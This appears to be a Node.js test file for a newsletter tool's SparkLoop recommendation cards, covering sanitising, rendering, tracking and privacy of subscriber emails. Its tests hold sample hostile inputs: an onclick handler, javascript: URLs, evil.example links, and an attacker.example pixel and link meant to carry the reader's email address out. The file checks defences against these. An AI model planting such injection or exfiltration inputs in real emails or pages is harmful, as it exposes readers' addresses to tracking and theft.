import assert from "node:assert/strict";
import { test } from "node:test";
import { renderIssueBody } from "../lib/archive-content.js";
import { cleanRichHtml } from "../lib/clean-html.js";
import { hasContent, renderEmail } from "../lib/render-email.js";
import { buildRecipientEmail } from "../lib/sending-rules.js";
import {
	MAX_CARDS,
	SUBSCRIBER_EMAIL_PLACEHOLDER,
	cardToHtml,
	expandCards,
	fillCardLink,
	getCardHref,
	readCard,
	stripSubscriberEmail,
	withoutSubscriberEmail,
} from "../lib/sparkloop-cards.js";
import { readClickToken } from "../lib/tracking.js";

process.env.SESSION_SECRET = "test-session-secret-with-at-least-32-characters";
process.env.APP_URL = "https://mail.example.com";

const offer = {
	kind: "offer",
	url: "https://recs.page/my-newsletter?offer_recommendation_uuid=offer_recommendation_1&lc=link_campaign_1",
	image: "https://dash.sparkloop.app/rails/active_storage/offer.png",
	brand: "Acme Notes",
	title: 'Write "faster" & better',
	description: "The notes app for fast thinkers.",
	cta: "Get 20% off",
};
const paid = { kind: "recommendation", paid: "true", url: "https://recs.page/my-newsletter?ref_code=a1&lc=2", title: "Money Matters" };
const free = { kind: "recommendation", url: "https://recs.page/my-newsletter?ref_code=b2&lc=3", title: "Field Guide", label: "A friend's pick" };
const body = `<p>Intro</p>${cardToHtml(offer)}<p>Outro</p>`;
const newsletter = { _id: "66f1a2b3c4d5e6f7a8b9c0d2", name: "Notes", fromEmail: "hi@mail.example.com" };
const contact = { _id: "66f1a2b3c4d5e6f7a8b9c0d3", email: "jane+news@example.com" };
const MESSAGE_ID = "66f1a2b3c4d5e6f7a8b9c0d1";

function clickDestinations(html) {
	return [...html.matchAll(/href="https:\/\/mail\.example\.com\/c\/([^"]+)"/g)].map(([, token]) => readClickToken(token).url);
}

test("cards survive the cleaner with only their own attributes", () => {
	const html = cleanRichHtml(
		`<div data-sparkloop-card="offer" data-url="${offer.url}" data-title="A &gt; B" onclick="steal()" style="color:red"></div>`
	);
	assert.match(html, /^<div data-sparkloop-card="offer" data-url="[^"]+" data-title="A &gt; B"><\/div>$/);
	assert.ok(!html.includes("onclick"));
	assert.ok(!html.includes("style"));
});

test("emails draw a styled card whose link asks for the reader's email", () => {
	const { html, text } = renderEmail({ format: "rich", html: body, subject: "Hi", newsletter });
	assert.ok(html.includes(">Write &quot;faster&quot; &amp; better</p>"));
	assert.ok(html.includes("Acme Notes"));
	assert.ok(html.includes("Get 20% off →"));
	assert.ok(html.includes(`&amp;email=${SUBSCRIBER_EMAIL_PLACEHOLDER}`));
	assert.ok(!html.includes("data-sparkloop-card"));
	// The card's picture keeps its own styles, not the editor's centered-image ones.
	assert.equal(html.match(/<img style="display:block;max-width:100%;height:auto;margin:24px auto/g), null);
	assert.match(text, /Get 20% off → \(https:\/\/recs\.page\/my-newsletter\?/);
});

test("the reader's email is never in the email: only the click fills it in", () => {
	const email = buildRecipientEmail({ campaign: { format: "rich", html: body, subject: "Hi" }, newsletter, contact, messageId: MESSAGE_ID });
	assert.ok(!email.html.includes("jane"));
	assert.ok(!email.text.includes("jane"));
	assert.ok(!email.text.includes(SUBSCRIBER_EMAIL_PLACEHOLDER));
	const destination = clickDestinations(email.html).find((url) => url.startsWith("https://recs.page/"));
	assert.ok(destination.endsWith(`&email=${SUBSCRIBER_EMAIL_PLACEHOLDER}`));
	assert.equal(fillCardLink(destination, contact.email), `${offer.url}&email=jane%2Bnews%40example.com`);
	// Test sends and link scanners get no address.
	assert.equal(fillCardLink(destination, null), offer.url);
});

test("a placeholder written in an issue never reaches anyone's email", () => {
	const html = `<html><body><img src="https://attacker.example/p.gif?e=${SUBSCRIBER_EMAIL_PLACEHOLDER}"><a href="https://attacker.example/?e=${SUBSCRIBER_EMAIL_PLACEHOLDER}">x</a>{{subscriber.email_address}}</body></html>`;
	const email = buildRecipientEmail({ campaign: { format: "html", html, subject: "Hi" }, newsletter, contact, messageId: MESSAGE_ID });
	assert.ok(!email.html.includes("jane"));
	assert.ok(!email.text.includes("jane"));
	const [destination] = clickDestinations(email.html);
	assert.equal(fillCardLink(destination, contact.email), "https://attacker.example/?e=");
	// Untracked emails lose the parameter too.
	const untracked = buildRecipientEmail({ campaign: { format: "rich", html: body, subject: "Hi" }, newsletter, contact, messageId: null });
	assert.ok(!untracked.html.includes(SUBSCRIBER_EMAIL_PLACEHOLDER));
});

test("the archive shows the card as a box without anyone's email", () => {
	const { html } = renderIssueBody({ format: "rich", html: body });
	assert.ok(html.includes('<div data-callout="" data-card="">'));
	assert.ok(html.includes("<h3>Write \"faster\" &amp; better</h3>"));
	assert.ok(!html.includes("email="));
	assert.ok(html.includes('rel="sponsored noopener"'));
	assert.ok(html.includes('href="https://recs.page/my-newsletter?offer_recommendation_uuid=offer_recommendation_1&amp;lc=link_campaign_1"'));
});

test("offers and paid recommendations always say Sponsored; free ones keep their label", () => {
	assert.equal(readCard(cardToHtml({ ...offer, label: "Our friends" }).slice(4, -7)).label, "Sponsored");
	assert.equal(readCard(cardToHtml({ ...paid, label: "Recommended read" }).slice(4, -7)).label, "Sponsored");
	assert.equal(readCard(cardToHtml(free).slice(4, -7)).label, "A friend's pick");
	assert.equal(readCard(cardToHtml({ ...free, label: "" }).slice(4, -7)).label, "Recommended read");
	const archive = renderIssueBody({ format: "rich", html: cardToHtml(paid) + cardToHtml(free) }).html;
	assert.ok(archive.includes("<p>Sponsored</p><h3>Money Matters</h3>"));
	assert.ok(archive.includes('rel="nofollow noopener"'));
});

test("cards only link to SparkLoop and only show web pictures", () => {
	assert.equal(readCard(` data-sparkloop-card="offer" data-url="https://evil.example/x" data-title="Hi"`), null);
	assert.equal(readCard(` data-sparkloop-card="offer" data-url="javascript:alert(1)" data-title="Hi"`), null);
	const card = readCard(
		` data-sparkloop-card="recommendation" data-url="https://recs.page/a?lc=1" data-title="Hi" data-image="javascript:x"`
	);
	assert.equal(card.image, "");
	assert.equal(card.cta, "Subscribe for free");
	assert.equal(expandCards('<div data-sparkloop-card="offer" data-url="https://evil.example/"></div>', { isEmail: true }), "");
});

test("a card is content, and a box marker in its text doesn't turn it into a box", () => {
	assert.equal(hasContent(cardToHtml(offer)), true);
	const tricky = cardToHtml({ ...offer, title: '<div data-callout="">' });
	const { html } = renderEmail({ format: "rich", html: tricky, newsletter });
	assert.ok(html.includes("Get 20% off →"));
});

test("an issue shows at most a few cards", () => {
	const many = cardToHtml(offer).repeat(MAX_CARDS + 5);
	const { html } = renderEmail({ format: "rich", html: many, newsletter });
	assert.equal(html.split("Get 20% off →").length - 1, MAX_CARDS);
});

test("long text is cut, and email parameters go from SparkLoop links", () => {
	const card = readCard(` data-sparkloop-card="offer" data-url="https://recs.page/a" data-title="${"x".repeat(400)}"`);
	assert.equal(card.title.length, 160);
	assert.equal(withoutSubscriberEmail("https://recs.page/a?lc=1&email={{subscriber.email_address}}&email=x"), "https://recs.page/a?lc=1");
	assert.equal(withoutSubscriberEmail("https://recs.page/a?email=x&lc=1"), "https://recs.page/a?lc=1");
	assert.equal(getCardHref("https://recs.page/a", { isEmail: true }), `https://recs.page/a?email=${SUBSCRIBER_EMAIL_PLACEHOLDER}`);
	assert.equal(stripSubscriberEmail(`See https://recs.page/a?lc=1&email=${SUBSCRIBER_EMAIL_PLACEHOLDER})`), "See https://recs.page/a?lc=1)");
});

test("cards are found in linear time, even in markup that never closes", () => {
	const size = 500_000;
	const repeat = (unit) => unit.repeat(Math.floor(size / unit.length));
	const shapes = [
		repeat("<div "),
		`${repeat("<div ")}>`,
		`${repeat('<div data-sparkloop-card="offer" ')}></div>`,
		repeat("<div>   "),
		`<div data-sparkloop-card="offer" data-title="${"x".repeat(size)}">`,
		repeat(cardToHtml(offer)),
	];
	for (const html of shapes) {
		const start = performance.now();
		renderEmail({ format: "rich", html, newsletter });
		expandCards(html, { isEmail: true });
		assert.ok(performance.now() - start < 1000, `${html.slice(0, 40)}…`);
	}
});
